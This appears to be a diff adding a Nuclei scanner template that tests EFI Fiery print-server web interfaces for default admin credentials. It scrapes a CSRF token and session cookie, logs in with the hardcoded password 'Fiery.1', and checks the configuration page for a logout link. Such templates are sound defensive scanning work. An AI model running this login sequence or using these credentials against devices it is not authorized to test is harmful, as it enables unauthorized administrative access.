@@ -1,0 +1,104 @@
+id: wt4-default-login
+
+info:
+  name: EFI Fiery Default Admin Login
+  author: n0ur5
+  severity: medium
+  description: |
+    This template attempts authentication against the EFI Fiery Web interface using the default credentials.
+  tags: csrf, auth, web
+  reference:
+    - "Requires -tlsi flag if TLS issues occur."
+
+http:
+  - raw:
+      - |
+        GET /wt4/login?lang=en HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate, br
+        Referer: https://{{Hostname}}/
+        Upgrade-Insecure-Requests: 1
+        Connection: keep-alive
+
+    max-redirects: 5  # Follow login page redirects
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        internal: true
+        group: 1
+        regex:
+          - '<meta content="authenticity_token" name="csrf-param" />\s*<meta content="([^"]+)" name="csrf-token"'
+
+      - type: regex
+        name: initial_session_id
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - "(?i)Set-Cookie:\\s*_session_id=([a-f0-9]+)"
+
+    stop-at-first-match: false  # Ensure both CSRF token and session ID are extracted
+
+  - raw:
+      - |
+        POST /wt4/login/do_login HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: _session_id={{initial_session_id}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/x-www-form-urlencoded
+        Origin: https://{{Hostname}}
+        Referer: https://{{Hostname}}/wt4/login?lang=en
+        Upgrade-Insecure-Requests: 1
+        Connection: keep-alive
+
+        user_name=Admin&password=Fiery.1&authenticity_token={{csrf_token}}
+
+    max-redirects: 5  # Follow login redirects
+
+    extractors:
+      - type: regex
+        name: new_session_id
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - "(?i)Set-Cookie:\\s*_session_id=([a-f0-9]+)"
+
+  - raw:
+      - |
+        GET /wt4/configure HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: _session_id={{new_session_id}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Referer: https://{{Hostname}}/wt4/login?lang=en
+        Connection: keep-alive
+
+    max-redirects: 5  # Follow all redirects until reaching HTTP 200
+
+  - raw:
+      - |
+        GET /wt4/configure/fiery_server HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: _session_id={{new_session_id}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Referer: https://{{Hostname}}/wt4/login?lang=en
+        Connection: keep-alive
+
+    max-redirects: 5  # Follow all redirects until reaching HTTP 200
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<label class="logout" ><a href="#" id="link_logout" onclick="logout();" >Log Out</a></label>'
